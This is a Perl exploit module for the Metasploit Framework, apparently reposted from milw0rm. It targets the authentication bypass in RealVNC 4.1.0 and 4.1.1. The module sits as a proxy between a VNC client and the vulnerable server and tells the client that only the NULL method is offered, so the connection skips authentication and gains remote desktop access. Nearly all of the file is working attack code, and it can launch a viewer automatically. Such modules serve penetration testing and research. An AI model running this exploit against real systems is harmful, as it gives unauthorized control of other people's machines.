##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::realvnc_41_bypass;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use POSIX;

my $advanced = {};
my $info =
  {
	'Name'           => 'RealVNC 4.1 Authentication Bypass',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        => [ 'H D Moore <hdm[at]metasploit.com>' ],
	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits an authentication bypass flaw in version
	4.1.0 and 4.1.1 of the RealVNC service. This module acts as a proxy
	between a VNC client and a vulnerable server. Credit for this should
	go to James Evans, who spent the time to figure this out after RealVNC
	released a binary-only patch.
}),

	'Arch'           => [  ],
	'OS'             => [  ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'LPORT'   => [ 1, 'PORT', 'The local VNC listener port',  5900      ],
		'LHOST'   => [ 1, 'HOST', 'The local VNC listener host', "0.0.0.0"  ],
		'RPORT'   => [ 1, 'PORT', 'The remote VNC target port', 5900      ],
		'RHOST'   => [ 1, 'HOST', 'The remote VNC target host'],
		'AUTOCONNECT' => [1, 'DATA', 'Automatically launch vncviewer', 1],
	  },

	'Refs'            =>
	  [
		['URL', 'http://secunia.com/advisories/20107/']
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'RealVNC' ],
	  ],

	'Keys'           => [ 'realvnc' ],

	'DisclosureDate' => 'May 15 2006',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('LHOST'),
		LocalPort => $self->GetVar('LPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local VNC listener on " . $self->GetVar('SSHDPORT'));
		return;
	}

	if ($self->GetVar('AUTOCONNECT') =~ /^(T|Y|1)/i) {
    	if (! fork()) {
        	system("vncviewer 127.0.0.1::".$self->GetVar('LPORT'));
        	exit(0);
    	}		
	}

	$self->PrintLine("[*] Waiting for VNC connections to " . $self->GetVar('LHOST') . ":" . $self->GetVar('LPORT') . "...");

	while (defined($client = $server->accept()))
	{
		$self->HandleVNCClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

# Stolen from InjectVNCStage.pm
sub HandleVNCClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Create a connection to the target system
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $self->GetVar('RHOST'),
		'PeerPort' => $self->GetVar('RPORT'),
		'SSL'      => $self->GetVar('SSL')
	);
	
	if ($s->IsError) {
		$self->PrintLine('[*] Could not connect to the target VNC service: ' . $s->GetError);
		$fd->Close;
		return;
	}
	
	my $res = $s->Recv(-1, 5);
	
	# Hello from server
	if ($res !~ /^RFB 003\.008/) {
		$self->PrintLine("[*] The remote VNC service is not vulnerable");
		$fd->Close;
		$s->Close;
		return;
	}
	# Send it to the client
	$fd->Send($res);
	
	# Hello from client
	$res = $fd->Recv(-1, 5);
	if ($res !~ /^RFB /) {
		$self->PrintLine("[*] The local VNC client appears to be broken");
		$fd->Close;
		$s->Close;
		return;
	}
	# Send it to the server
	$s->Send($res);
	
	# Read the authentication methods from the server
	$res = $s->Recv(-1, 5);
	
	# Tell the client that the server only supports NULL auth
	$fd->Send("\x01\x01");
	
	# Start pumping data between the client and server
	if (! fork()) {
		$self->PrintLine("[*] Proxying data between the connections...");
		$self->VNCProxy($s->Socket, $fd->Socket);
		exit(0);
	}
	return;
}

sub VNCProxy {
  my $self = shift;
  my $srv = shift;
  my $cli = shift;

  foreach ($srv, $cli) {
    $_->blocking(1);
    $_->autoflush(1);
  }

  my $selector = IO::Select->new($srv, $cli);

  LOOPER:
    while(1) {
      my @ready = $selector->can_read;
      foreach my $ready (@ready) {
        if($ready == $cli) {
          my $data;
          $cli->recv($data, 8192);
          last LOOPER if (! length($data));     
          last LOOPER if(!$srv || !$srv->connected);
          eval { $srv->send($data); };
          last LOOPER if $@;
        }
        elsif($ready == $srv) {
          my $data;
          $srv->recv($data, 8192);
          last LOOPER if(!length($data));
          last LOOPER if(!$cli || !$cli->connected);
          eval { $cli->send($data); };
          last LOOPER if $@;
        }
      }
    }
}


1;


# milw0rm.com [2006-05-15]
